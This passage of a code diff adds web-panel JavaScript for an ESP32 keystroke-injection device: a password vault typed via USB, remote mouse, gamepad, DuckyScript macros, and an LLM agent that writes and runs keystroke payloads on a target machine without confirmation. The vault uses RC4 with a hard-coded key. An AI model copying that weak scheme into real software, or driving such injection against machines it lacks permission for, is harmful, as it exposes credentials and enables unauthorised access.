+          <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <span>CREDENTIAL</span>
+        </span>
+        <button class="fav-del-btn" onclick="event.stopPropagation(); deleteVaultEntry('${escHtml(item.name)}')" title="Delete" style="background:rgba(255,68,68,0.1); border:1px solid rgba(255,68,68,0.2); color:#ff4444; border-radius:6px; width:24px; height:24px; display:flex; align-items:center; justify-content:center; cursor:pointer;">
+          <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+        </button>
+      </div>
+      <div class="fav-card-name" onclick="runVaultEntry('${escHtml(item.name)}')" style="cursor:pointer; font-weight:700; font-size:0.95rem; color:var(--white); font-family:var(--mono);">${escHtml(item.name)}</div>
+      <div class="fav-card-meta" style="font-family:var(--mono); font-size:0.7rem; color:var(--dim);">${escHtml(item.path)}</div>
+      <div style="display:flex; gap:6px; margin-top:auto; width:100%;">
+        <button class="btn btn-primary" onclick="event.stopPropagation(); runVaultEntry('${escHtml(item.name)}')" style="flex:1; padding:8px 12px; font-size:0.75rem; display:flex; align-items:center; justify-content:center; gap:6px;" title="Type password via USB">
+          <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+          <span>Type via USB</span>
+        </button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function filterVaultList() {
+  renderVaultGrid();
+}
+
+function showAddVaultModal() {
+  $('vaultSiteName').value = '';
+  $('vaultPassword').value = '';
+  $('addVaultModal').style.display = 'flex';
+  setTimeout(() => $('vaultSiteName') && $('vaultSiteName').focus(), 100);
+}
+
+function hideAddVaultModal() {
+  $('addVaultModal').style.display = 'none';
+}
+
+async function confirmAddVault() {
+  const site = $('vaultSiteName').value.trim();
+  const password = $('vaultPassword').value.trim();
+
+  if (!site) { toast('Enter a site name', 'warn'); return; }
+  if (!password) { toast('Enter a password', 'warn'); return; }
+
+  const safeSite = site.replace(/[^a-zA-Z0-9_\-]/g, '');
+  if (!safeSite) { toast('Invalid site name (use letters, numbers, _ or -)', 'warn'); return; }
+
+  const btn = $('vaultAddConfirmBtn');
+  const oldText = btn.innerHTML;
+  btn.innerHTML = '<span class="spin"></span> Saving…';
+  btn.disabled = true;
+
+  try {
+    const content = `DELAY 500\nSTRING ${password}`;
+    const encryptedContent = 'ENC:' + encryptVault(content);
+
+    try {
+      await fmFetchPost('/fm/mkdir?path=%2FVault');
+    } catch (e) { }
+
+    const uploadUrl = fmBase() + '/fm/upload?path=%2FVault';
+    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
+    const blob = new Blob([encryptedContent], { type: 'text/plain' });
+    const file = new File([blob], safeSite + '.txt', { type: 'text/plain' });
+    const fd = new FormData();
+    fd.append('file', file, safeSite + '.txt');
+
+    const opts = crossOrigin
+      ? { method: 'POST', mode: 'no-cors', body: fd }
+      : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };
+
+    await fetch(uploadUrl, opts);
+
+    toast(`Saved /Vault/${safeSite}.txt ✓`);
+    hideAddVaultModal();
+    initVaultApp();
+  } catch (e) {
+    toast('Save failed', 'err');
+  } finally {
+    btn.innerHTML = oldText;
+    btn.disabled = false;
+  }
+}
+// ─── Vault Encryption Utilities ───
+function rc4(key, str) {
+  let s = [], j = 0, x, res = '';
+  for (let i = 0; i < 256; i++) s[i] = i;
+  for (let i = 0; i < 256; i++) {
+    j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
+    x = s[i]; s[i] = s[j]; s[j] = x;
+  }
+  let i = 0; j = 0;
+  for (let y = 0; y < str.length; y++) {
+    i = (i + 1) % 256;
+    j = (j + s[i]) % 256;
+    x = s[i]; s[i] = s[j]; s[j] = x;
+    res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
+  }
+  return res;
+}
+
+function encryptVault(text) {
+  // Convert text to base64 after RC4 encryption to store safely as text
+  return btoa(rc4('ghostchip@14', text));
+}
+
+function decryptVault(base64) {
+  return rc4('ghostchip@14', atob(base64));
+}
+
+async function deleteVaultEntry(site) {
+  if (!confirm(`Delete password for ${site}?`)) return;
+  const path = `/Vault/${site}.txt`;
+  try {
+    await fmFetchPost('/fm/delete?path=' + encodeURIComponent(path));
+    toast(`Deleted ${site} ✓`);
+    initVaultApp();
+  } catch (e) {
+    toast(`Could not delete: ${e.message}`, 'err');
+  }
+}
+
+async function runVaultEntry(site) {
+  const path = `/Vault/${site}.txt`;
+  toast(`Typing password for ${site}…`, 'warn', 3000);
+  try {
+    const r = await fmFetch('/fm/download?path=' + encodeURIComponent(path));
+    const text = await r.text();
+    let scriptToRun = text;
+    if (text.startsWith('ENC:')) {
+      const b64 = text.substring(4);
+      scriptToRun = decryptVault(b64);
+    }
+    
+    await deviceFetch('/', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'duckyscript=' + encodeURIComponent(scriptToRun)
+    });
+    
+    toast(`Password typed ✓`);
+  } catch (e) {
+    toast(`Typing sent. Check target.`, 'warn');
+  }
+}
+
+// ─── Remote Mouse Tool ───
+let mouseLastX = 0;
+let mouseLastY = 0;
+let mouseThrottle = null;
+let mouseTapStart = 0;
+let mouseTapX = 0;
+let mouseTapY = 0;
+let mouseMaxTouches = 0;
+
+function initMouseApp() {
+  document.querySelectorAll('.trackpad').forEach(pad => {
+    if (pad.hasAttribute('data-mouse-init')) return;
+    pad.setAttribute('data-mouse-init', '1');
+
+    pad.addEventListener('touchstart', e => {
+      e.preventDefault();
+      mouseLastX = e.touches[0].clientX;
+      mouseLastY = e.touches[0].clientY;
+      if (e.touches.length === 1) {
+        mouseTapX = mouseLastX;
+        mouseTapY = mouseLastY;
+        mouseTapStart = Date.now();
+      }
+      mouseMaxTouches = Math.max(mouseMaxTouches, e.touches.length);
+    }, { passive: false });
+
+    pad.addEventListener('touchmove', e => {
+      e.preventDefault();
+      mouseMaxTouches = Math.max(mouseMaxTouches, e.touches.length);
+      if (mouseThrottle) return;
+      
+      const currentX = e.touches[0].clientX;
+      const currentY = e.touches[0].clientY;
+      
+      // Scale delta for faster mouse movement feel
+      const dx = Math.round((currentX - mouseLastX) * 1.5);
+      const dy = Math.round((currentY - mouseLastY) * 1.5);
+      
+      mouseLastX = currentX;
+      mouseLastY = currentY;
+
+      if (e.touches.length === 2) {
+        // Two-finger scroll
+        if (dy !== 0) {
+          // Send scaled vertical scroll command; pulling down scrolls up (standard scroll direction)
+          let scrollAmt = Math.round(-dy / 2);
+          if (scrollAmt !== 0) {
+            deviceFetch('/mouse', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+              body: `scroll=${scrollAmt}`
+            });
+            mouseThrottle = setTimeout(() => { mouseThrottle = null; }, 40);
+          }
+        }
+      } else {
+        // Single-finger movement
+        if (dx !== 0 || dy !== 0) {
+          deviceFetch('/mouse', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `x=${dx}&y=${dy}`
+          });
+          mouseThrottle = setTimeout(() => { mouseThrottle = null; }, 40); // ~25 FPS
+        }
+      }
+    }, { passive: false });
+    
+    pad.addEventListener('touchend', e => {
+      e.preventDefault();
+      if (e.touches.length === 0) {
+        const duration = Date.now() - mouseTapStart;
+        const dist = Math.hypot(mouseLastX - mouseTapX, mouseLastY - mouseTapY);
+        
+        // If it was a quick tap with very little movement
+        if (duration < 250 && dist < 15) {
+          if (mouseMaxTouches === 1) sendMouseClick('left');
+          else if (mouseMaxTouches >= 2) sendMouseClick('right');
+        }
+        mouseMaxTouches = 0; // reset for next touch
+      }
+    }, { passive: false });
+  });
+}
+
+function sendMouseClick(btn) {
+  deviceFetch('/mouse', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: `click=${btn}`
+  });
+  navigator.vibrate && navigator.vibrate(20);
+}
+
+function sendKeyCommand(key) {
+  deviceFetch('/', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: `duckyscript=${encodeURIComponent(key)}`
+  });
+  navigator.vibrate && navigator.vibrate(20);
+}
+
+// ─── Virtual Gamepad App ───
+let gpActive = false;
+let gpThrottle = null;
+let gpState = { btn: 0, x: 0, y: 0, z: 0, rz: 0, hat: 0 };
+let gpStickL = null, gpBaseL = null;
+let gpStickR = null, gpBaseR = null;
+
+function initGamepadApp() {
+  gpBaseL = $('gpBaseL'); gpStickL = $('gpStickL');
+  gpBaseR = $('gpBaseR'); gpStickR = $('gpStickR');
+  if (!gpBaseL || gpBaseL.hasAttribute('data-gp-init')) return;
+  gpBaseL.setAttribute('data-gp-init', '1');
+  
+  function setupStick(base, stick, isLeft) {
+    let activeTouchId = null;
+    
+    function update(cx, cy) {
+      let rect = base.getBoundingClientRect();
+      let centerX = rect.width / 2;
+      let centerY = rect.height / 2;
+      let stickWidth = stick.getBoundingClientRect().width;
+      let maxRadius = (rect.width / 2) - (stickWidth / 2);
+
+      let dx = cx - (rect.left + centerX);
+      let dy = cy - (rect.top + centerY);
+      let distance = Math.min(maxRadius, Math.sqrt(dx*dx + dy*dy));
+      let angle = Math.atan2(dy, dx);
+      
+      let moveX = distance * Math.cos(angle);
+      let moveY = distance * Math.sin(angle);
+      
+      stick.style.transform = `translate(${moveX}px, ${moveY}px)`;
+      stick.classList.add('active');
+      
+      let valX = Math.round((moveX / maxRadius) * 127);
+      let valY = Math.round((moveY / maxRadius) * 127);
+      
+      if (isLeft) { gpState.x = valX; gpState.y = valY; }
+      else { gpState.z = valX; gpState.rz = valY; }
+      sendGpUpdate();
+    }
+    
+    function reset() {
+      stick.style.transform = 'translate(0px, 0px)';
+      stick.classList.remove('active');
+      if (isLeft) { gpState.x = 0; gpState.y = 0; }
+      else { gpState.z = 0; gpState.rz = 0; }
+      activeTouchId = null;
+      sendGpUpdate();
+    }
+    
+    base.addEventListener('touchstart', e => {
+      e.preventDefault();
+      for (let i = 0; i < e.changedTouches.length; i++) {
+        if (activeTouchId === null) {
+          activeTouchId = e.changedTouches[i].identifier;
+          update(e.changedTouches[i].clientX, e.changedTouches[i].clientY);
+        }
+      }
+    }, { passive: false });
+    
+    base.addEventListener('touchmove', e => {
+      e.preventDefault();
+      for (let i = 0; i < e.changedTouches.length; i++) {
+        if (e.changedTouches[i].identifier === activeTouchId) {
+          update(e.changedTouches[i].clientX, e.changedTouches[i].clientY);
+        }
+      }
+    }, { passive: false });
+    
+    base.addEventListener('touchend', e => {
+      e.preventDefault();
+      for (let i = 0; i < e.changedTouches.length; i++) {
+        if (e.changedTouches[i].identifier === activeTouchId) reset();
+      }
+    }, { passive: false });
+    
+    base.addEventListener('touchcancel', e => { reset(); });
+  }
+  
+  setupStick(gpBaseL, gpStickL, true);
+  setupStick(gpBaseR, gpStickR, false);
+}
+
+function gpBtnPress(btnCode) {
+  navigator.vibrate && navigator.vibrate(10);
+  gpState.btn |= (1 << (btnCode - 1));
+  sendGpUpdate();
+}
+
+function gpBtnRelease(btnCode) {
+  gpState.btn &= ~(1 << (btnCode - 1));
+  sendGpUpdate();
+}
+
+function gpDpad(hatVal) {
+  if (hatVal !== 0) navigator.vibrate && navigator.vibrate(10);
+  gpState.hat = hatVal;
+  sendGpUpdate();
+}
+
+function sendGpUpdate() {
+  if (gpThrottle) return;
+  deviceFetch('/gamepad', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: `x=${gpState.x}&y=${gpState.y}&z=${gpState.z}&rz=${gpState.rz}&hat=${gpState.hat}&btn=${gpState.btn}`
+  });
+  gpThrottle = setTimeout(() => { gpThrottle = null; }, 40); // 25 FPS
+}
+
+// ─── Shortcuts Tool App ───
+var shortcutsEntries = [];
+
+async function initShortcutsApp() {
+  const grid = $('shortcutsGrid');
+  if (!grid) return;
+  grid.innerHTML = '<div class="fav-empty"><span class="spin"></span> Loading shortcuts...</div>';
+
+  try {
+    try {
+      await fmFetchPost('/fm/mkdir?path=%2FShortcuts');
+    } catch (e) { }
+
+    const r = await fmFetch('/fm/list?path=%2FShortcuts');
+    const text = await r.text();
+    let data;
+    try { data = JSON.parse(text); } catch { data = []; }
+    const items = Array.isArray(data) ? data : (data.files || data.entries || []);
+
+    shortcutsEntries = [];
+    items.forEach(item => {
+      const isDir = item.dir === true || item.type === 'dir' || item.isDir || item.directory;
+      if (!isDir) {
+        const name = item.name || item.filename || '';
+        if (name.endsWith('.txt')) {
+          shortcutsEntries.push({
+            name: name.replace(/\.txt$/, ''),
+            path: '/Shortcuts/' + name
+          });
+        }
+      }
+    });
+
+    renderShortcutsGrid();
+  } catch (e) {
+    grid.innerHTML = '<div class="fav-empty">Failed to load Shortcuts.</div>';
+  }
+}
+
+function renderShortcutsGrid() {
+  const grid = $('shortcutsGrid');
+  if (!grid) return;
+
+  const query = ($('shortcutsSearch') ? $('shortcutsSearch').value : '').trim().toLowerCase();
+  const filtered = shortcutsEntries.filter(e => e.name.toLowerCase().includes(query));
+
+  if (!filtered.length) {
+    grid.innerHTML = '<div class="fav-empty">' + (query ? 'No matching shortcuts found.' : 'No shortcuts yet. Click + Add to create one.') + '</div>';
+    return;
+  }
+
+  grid.innerHTML = filtered.map(item => {
+    return `<div class="fav-card tag-recon pro-ai-card" id="shortcut-card-${item.name}" style="padding:14px; display:flex; flex-direction:column; gap:10px; background:var(--s2); border:1px solid rgba(0,200,255,0.25); border-radius:12px;">
+      <div class="fav-card-top" style="display:flex; justify-content:space-between; align-items:center;">
+        <span class="fav-tag-badge tag-recon" style="display:flex; align-items:center; gap:5px; font-size:0.68rem; font-weight:700; color:#00c8ff;">
+          <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+          <span>SHORTCUT MACRO</span>
+        </span>
+        <button class="fav-del-btn" onclick="event.stopPropagation(); deleteShortcutEntry('${escHtml(item.name)}')" title="Delete" style="background:rgba(255,68,68,0.1); border:1px solid rgba(255,68,68,0.2); color:#ff4444; border-radius:6px; width:24px; height:24px; display:flex; align-items:center; justify-content:center; cursor:pointer;">
+          <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+        </button>
+      </div>
+      <div class="fav-card-name" onclick="runShortcutEntry('${escHtml(item.name)}')" style="cursor:pointer; font-weight:700; font-size:0.95rem; color:var(--white); font-family:var(--mono);">${escHtml(item.name)}</div>
+      <div class="fav-card-meta" style="font-family:var(--mono); font-size:0.7rem; color:var(--dim);">${escHtml(item.path)}</div>
+      <div style="display:flex; gap:6px; margin-top:auto; width:100%;">
+        <button class="btn btn-primary" onclick="event.stopPropagation(); runShortcutEntry('${escHtml(item.name)}')" style="flex:1; padding:8px 12px; font-size:0.75rem; background: linear-gradient(135deg, #00c8ff, #0088ff); display:flex; align-items:center; justify-center; gap:6px;" title="Execute shortcut immediately">
+          <svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+          <span>Run Macro</span>
+        </button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function filterShortcutsList() {
+  renderShortcutsGrid();
+}
+
+function showAddShortcutModal() {
+  $('shortcutName').value = '';
+  $('shortcutScript').value = '';
+  $('addShortcutModal').style.display = 'flex';
+  setTimeout(() => $('shortcutName') && $('shortcutName').focus(), 100);
+}
+
+function hideAddShortcutModal() {
+  $('addShortcutModal').style.display = 'none';
+}
+
+async function confirmAddShortcut() {
+  const name = $('shortcutName').value.trim();
+  const script = $('shortcutScript').value.trim();
+
+  if (!name) { toast('Enter a shortcut name', 'warn'); return; }
+  if (!script) { toast('Enter DuckyScript body', 'warn'); return; }
+
+  const safeName = name.replace(/[^a-zA-Z0-9_\-]/g, '');
+  if (!safeName) { toast('Invalid shortcut name (use letters, numbers, _ or -)', 'warn'); return; }
+
+  const btn = $('shortcutAddConfirmBtn');
+  const oldText = btn.innerHTML;
+  btn.innerHTML = '<span class="spin"></span> Saving…';
+  btn.disabled = true;
+
+  try {
+    try {
+      await fmFetchPost('/fm/mkdir?path=%2FShortcuts');
+    } catch (e) { }
+
+    const uploadUrl = fmBase() + '/fm/upload?path=%2FShortcuts';
+    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
+    const blob = new Blob([script], { type: 'text/plain' });
+    const file = new File([blob], safeName + '.txt', { type: 'text/plain' });
+    const fd = new FormData();
+    fd.append('file', file, safeName + '.txt');
+
+    const opts = crossOrigin
+      ? { method: 'POST', mode: 'no-cors', body: fd }
+      : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };
+
+    await fetch(uploadUrl, opts);
+
+    toast(`Saved /Shortcuts/${safeName}.txt ✓`);
+    hideAddShortcutModal();
+    initShortcutsApp();
+  } catch (e) {
+    toast('Save failed', 'err');
+  } finally {
+    btn.innerHTML = oldText;
+    btn.disabled = false;
+  }
+}
+
+async function deleteShortcutEntry(name) {
+  if (!confirm(`Delete shortcut ${name}?`)) return;
+  const path = `/Shortcuts/${name}.txt`;
+  try {
+    await fmFetchPost('/fm/delete?path=' + encodeURIComponent(path));
+    toast(`Deleted ${name} ✓`);
+    initShortcutsApp();
+  } catch (e) {
+    toast(`Could not delete: ${e.message}`, 'err');
+  }
+}
+
+async function runShortcutEntry(name) {
+  const path = `/Shortcuts/${name}.txt`;
+  toast(`Running shortcut ${name}…`, 'warn', 3000);
+  try {
+    await fmFetchPost('/fm/run?path=' + encodeURIComponent(path));
+    toast(`Shortcut executed ✓`);
+  } catch (e) {
+    toast(`Shortcut sent. Check device.`, 'warn');
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  AI AGENT — Browser-native LangGraph-style ReAct Agent
+//  Think → Action → Observation loop powered by OpenRouter API
+// ═══════════════════════════════════════════════════════════════
+
+let agentRunning = false;
+let agentAbort = false;
+let agentHistory = [];   // persists across runs within session
+let agentInspectorOpen = false;
+const AGENT_MODEL = 'poolside/laguna-xs-2.1';
+
+// ─── System Prompt ────────────────────────────────────────────
+const AGENT_SYSTEM_PROMPT = `You are GhostChip AI Agent — an autonomous HID operator for a GhostChip ESP32 device that physically injects keystrokes, manages SD card files & directories, controls WiFi, and drives an RGB LED.
+
+## STRICT OUTPUT FORMAT — ONE STEP PER RESPONSE
+
+You MUST output EXACTLY ONE of these two formats per response, nothing else:
+
+FORMAT A — When you need to call a tool:
+Thought: <your reasoning>
+Action: <exact_tool_name>
+Action Input: <tool input — stop writing here, do NOT write Observation>
+
+FORMAT B — When you are completely done:
+Thought: <final reasoning>
+FINAL: <summary of what was done>
+
+## CRITICAL RULES
+1. Output ONLY Format A or Format B. NEVER write "Observation:" yourself — the system injects real results.
+2. After writing "Action Input: ...", STOP immediately. Wait for the system Observation.
+3. One tool call per response. No chaining multiple Actions in one response.
+4. When asked to create a script and execute it:
+   Step 1: Action: generate_hid_script (or write DuckyScript)
+   Step 2: Action: write_file to save the DuckyScript to the SD card (e.g. /utility/notes.txt)
+   Step 3: Action: run_script to execute the saved script file from the SD card (e.g. /utility/notes.txt)
+5. In all generated DuckyScript payloads, ALWAYS insert DELAY 2000 after each action line.
+
+## AVAILABLE TOOLS
+
+generate_hid_script
+  Generates DuckyScript for a task. Input: task description (e.g. "Open Spotlight on Mac and type Notes then press Enter")
+
+execute_script
+  Executes raw DuckyScript directly on target HID device immediately. Input: DuckyScript code.
+
+run_script
+  Runs an existing DuckyScript file saved on the SD card by path. Input: file path (e.g. /utility/notes.txt)
+
+list_files
+  Lists files and folders on SD card. Input: directory path (e.g. / or /utility or /Shortcuts)
+
+read_file
+  Reads contents of a file on the SD card. Input: file path (e.g. /utility/notes.txt)
+
+write_file
+  Creates or overwrites a file on the SD card (auto-creates parent directories if needed).
+  Input format (JSON): {"path": "/utility/notes.txt", "content": "GUI SPACE\\nDELAY 2000\\nSTRING notes\\nDELAY 2000\\nENTER\\nDELAY 2000"}
+
+create_directory
+  Creates a new folder on the SD card. Input: folder path (e.g. /utility)
+
+delete_file
+  Deletes a file or directory from the SD card. Input: file or folder path (e.g. /utility/notes.txt)
+
+get_device_info
+  Returns chip info, MAC, IP, firmware version. Input: none
+
+wifi_scan
+  Triggers a WiFi AP scan. Input: none
+
+ble_scan
+  Scans nearby Bluetooth Low Energy (BLE) devices & Flipper Zero devices. Input: none
+
+wifi_connect
+  Connects to a WiFi network. Input: {"ssid":"Name","password":"pass"}
+
+neopixel_set
+  Sets NeoPixel RGB color. Input: {"r":255,"g":0,"b":0} or "red"
+
+neopixel_toggle
+  Toggles NeoPixel on/off. Input: none
+
+get_script_from_editor
+  Reads the current DuckyScript from the editor tab. Input: none
+
+send_script_to_editor
+  Pushes script text into the editor tab. Input: script text
+
+execute_keystroke
+  Injects immediate HID keystroke/command directly without writing to SD card. Input: "GUI SPACE" or "CTRL ALT t" or "STRING hello"
+
+get_execution_status
+  Checks if device is currently executing a payload or idle. Input: none
+
+deauth_monitor
+  Monitors WiFi deauth attacks. Input: "start", "stop", or "get_logs"
+
+list_shortcuts
+  Lists saved payload shortcuts on SD card. Input: none
+
+run_shortcut
+  Executes a saved shortcut payload from /Shortcuts/ folder. Input: shortcut name (e.g. mac-spotlight)
+
+generate_enhanced_prompt
+  Converts a core instruction into a structured Master System Prompt using Qwen 3.6. Input: core request
+
+## EXAMPLE SCENARIO: Create script in folder & run it
+User: Create a script called notes inside utility which should open notes in my mac and run it.
+
+Thought: First I will generate the DuckyScript payload to open Notes on Mac with DELAY 2000 after each line.
+Action: generate_hid_script
+Action Input: Open Spotlight on Mac using Command+Space, wait 2000ms, type notes, wait 2000ms, press Enter, wait 2000ms
+
+[System injects Observation]
+
+Thought: Now I will create the file /utility/notes.txt on the SD card containing this DuckyScript payload.
+Action: write_file
+Action Input: {"path": "/utility/notes.txt", "content": "GUI SPACE\\nDELAY 2000\\nSTRING notes\\nDELAY 2000\\nENTER\\nDELAY 2000"}
+
+[System injects Observation]
+
+Thought: Now I will execute the script file /utility/notes.txt from the SD card on the device.
+Action: run_script
+Action Input: /utility/notes.txt
+
+[System injects Observation]
+
+Thought: The script was created at /utility/notes.txt and executed successfully.
+FINAL: Successfully created /utility/notes.txt on the SD card and executed it on the target Mac.`;
+
+// ─── Tool Implementations ─────────────────────────────────────
+const agentTools = {
+
+  async execute_script(input) {
+    const script = input.trim();
+    if (!script) return 'Error: no script provided';
+    try {
+      await deviceFetch('/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'duckyscript=' + encodeURIComponent(script)
+      });
+      return `Script sent to device successfully (${script.split('\n').length} lines).\n\nScript:\n${script}`;
+    } catch (e) {
+      return 'Error sending script: ' + e.message;
+    }
+  },
+
+  async generate_hid_script(input) {
+    const keyToUse = OPENROUTER_KEY || localStorage.getItem('gc_openrouter_key') || '';
+    if (!keyToUse) return 'Error: No OpenRouter API key configured. Go to Settings → OpenRouter API Key and add your key.';
+
+    const endpoint = 'https://openrouter.ai/api/v1/chat/completions';
+    const modelToUse = AGENT_MODEL;
+
+    const sysPrompt = `STRICT DUCKYSCRIPT SYNTAX RULES:
+1. ALL DuckyScript keywords and key names MUST be UPPERCASE (e.g. GUI SPACE, ENTER, STRING, DELAY 2000). NEVER write "GUI space".
+2. EXECUTING TERMINAL COMMANDS: Every shell command typed with "STRING <cmd>" MUST be followed by "ENTER" to execute it!
+   Example:
+   GUI SPACE
+   DELAY 2000
+   STRING terminal
+   DELAY 2000
+   ENTER
+   DELAY 2000
+   STRING mkdir ducky
+   DELAY 2000
+   ENTER
+   DELAY 2000
+   STRING cd ducky
+   DELAY 2000
+   ENTER
+   DELAY 2000
+   STRING echo "What is a HID attack?" > ducky.txt
+   DELAY 2000
+   ENTER
+3. Always insert DELAY 2000 after each action line.
+4. Output ONLY raw executable DuckyScript code lines. DO NOT output reasoning, thinking process, preamble, or markdown.`;
+
+    const headers = {
+      'Content-Type': 'application/json',
+      'Authorization': 'Bearer ' + keyToUse,
+      'HTTP-Referer': window.location.href,
+      'X-Title': 'GhostChip AI Agent'
+    };
+
+    try {
+      const res = await fetch(endpoint, {
+        method: 'POST',
+        headers,
+        body: JSON.stringify({
+          model: modelToUse,
+          messages: [
+            { role: 'system', content: sysPrompt },
+            { role: 'user', content: 'Generate DuckyScript for: ' + input }
+          ],
+          temperature: 0.6,
+          top_p: 0.95,
+          max_tokens: 2048
+        })
+      });
+      if (!res.ok) {
+        const err = await res.json().catch(() => ({}));
+        return 'Error from OpenRouter API: ' + (err.error?.message || res.statusText);
+      }
+      const data = await res.json();
+      let raw = (data.choices[0]?.message?.content || '').trim();
+      return cleanDuckyScriptOutput(raw);
+    } catch (e) {
+      return 'Error generating script: ' + e.message;
+    }
+  },
+
+  async get_device_info(_input) {
+    try {
+      const data = await deviceGet('/info');
+      return JSON.stringify(data, null, 2);
+    } catch (e) {
+      return 'Could not fetch device info: ' + e.message;
+    }
+  },
+
+  async list_files(input) {
+    let path = (input || '/').trim() || '/';
+    try {
+      const parsed = JSON.parse(path);
+      if (parsed && (parsed.path || parsed.folder)) path = parsed.path || parsed.folder;
+    } catch { }
+    if (!path.startsWith('/')) path = '/' + path;
+    try {
+      const r = await fmFetch('/fm/list?path=' + encodeURIComponent(path));
+      const text = await r.text();
+      let data;
+      try { data = JSON.parse(text); } catch { data = null; }
+      if (!data) return 'Response from ' + path + ': ' + (text || 'Empty response or directory unavailable');
+      const files = data.files || (Array.isArray(data) ? data : null);
+      if (Array.isArray(files)) {
+        if (files.length === 0) return `Directory "${path}" is empty.`;
+        return files.map(f => {
+          const isDir = f.type === 'dir' || f.isDir;
+          const sz = f.size !== undefined ? ` (${f.size} B)` : '';
+          return `${isDir ? '📁' : '📄'} ${f.name}${sz}`;
+        }).join('\n');
+      }
+      return 'File listing for ' + path + ':\n' + text;
+    } catch (e) {
+      return 'Error listing files: ' + e.message;
+    }
+  },
+  async ls(input) { return this.list_files(input); },
+  async dir(input) { return this.list_files(input); },
+
+  async read_file(input) {
+    let path = (input || '').trim();
+    try {
+      const parsed = JSON.parse(path);
+      if (parsed && (parsed.path || parsed.filename || parsed.file)) path = parsed.path || parsed.filename || parsed.file;
+    } catch { }
+    if (!path) return 'Error: path is required';
+    if (!path.startsWith('/')) path = '/' + path;
+    try {
+      const r = await fmFetch('/fm/download?path=' + encodeURIComponent(path));
+      const text = await r.text();
+      if (!text && !r.ok) return `File "${path}" not found or unavailable (HTTP ${r.status}).`;
+      return text ? text.substring(0, 3000) + (text.length > 3000 ? '\n...(truncated)' : '') : `(File "${path}" is empty)`;
+    } catch (e) {
+      return 'Error reading file: ' + e.message;
+    }
+  },
+  async cat(input) { return this.read_file(input); },
+  async read(input) { return this.read_file(input); },
+  async get_file(input) { return this.read_file(input); },
+
+  async write_file(input) {
+    let path = '', content = '';
+    try {
+      const parsed = JSON.parse(input);
+      path = parsed.path || parsed.filename || parsed.filepath || parsed.file || '';
+      content = parsed.content !== undefined ? parsed.content : (parsed.script || parsed.text || parsed.code || '');
+    } catch {
+      const lines = input.trim().split('\n');
+      path = lines[0].trim();
+      content = lines.slice(1).join('\n');
+    }
+    if (!path) return 'Error: path is required. Format: {"path":"/utility/notes.txt", "content":"..."}';
+    if (!path.startsWith('/')) path = '/' + path;
+
+    const lastSlash = path.lastIndexOf('/');
+    const folder = lastSlash > 0 ? path.substring(0, lastSlash) : '/';
+    const filename = lastSlash >= 0 ? path.substring(lastSlash + 1) : path;
+
+    try {
+      if (folder !== '/') {
+        await fmFetchPost('/fm/mkdir?path=' + encodeURIComponent(folder)).catch(() => { });
+      }
+      const uploadUrl = fmBase() + '/fm/upload?path=' + encodeURIComponent(folder);
+      const blob = new Blob([content], { type: 'text/plain' });
+      const file = new File([blob], filename, { type: 'text/plain' });
+      const form = new FormData();
+      form.append('file', file, filename);
+      const crossOrigin = new URL(uploadUrl).origin !== location.origin;
+      const opts = crossOrigin
+        ? { method: 'POST', mode: 'no-cors', body: form }
+        : { method: 'POST', headers: { 'Accept': '*/*' }, body: form };
+      await fetch(uploadUrl, opts);
+      return `File successfully created & saved to ${path} (${content.length} bytes).`;
+    } catch (e) {
+      return 'Error writing file: ' + e.message;
+    }
+  },
+  async create_file(input) { return this.write_file(input); },
+  async save_file(input) { return this.write_file(input); },
+  async new_file(input) { return this.write_file(input); },
+
+  async create_directory(input) {
+    let path = (input || '').trim();
+    try {
+      const parsed = JSON.parse(path);
+      if (parsed && (parsed.path || parsed.folder)) path = parsed.path || parsed.folder;
+    } catch { }
+    if (!path) return 'Error: directory path is required';
+    if (!path.startsWith('/')) path = '/' + path;
+    try {
+      await fmFetchPost('/fm/mkdir?path=' + encodeURIComponent(path));
+      return `Directory "${path}" created successfully.`;
+    } catch (e) {
+      return 'Error creating directory: ' + e.message;
+    }
+  },
+  async mkdir(input) { return this.create_directory(input); },
+
+  async delete_file(input) {
+    let path = (input || '').trim();
+    try {
+      const parsed = JSON.parse(path);
+      if (parsed && (parsed.path || parsed.filename)) path = parsed.path || parsed.filename;
+    } catch { }
+    if (!path) return 'Error: path is required for deletion';
+    if (!path.startsWith('/')) path = '/' + path;
+    try {
+      await fmFetchPost('/fm/delete?path=' + encodeURIComponent(path));
+      return `Successfully deleted: ${path}`;
+    } catch (e) {
+      return 'Error deleting: ' + e.message;
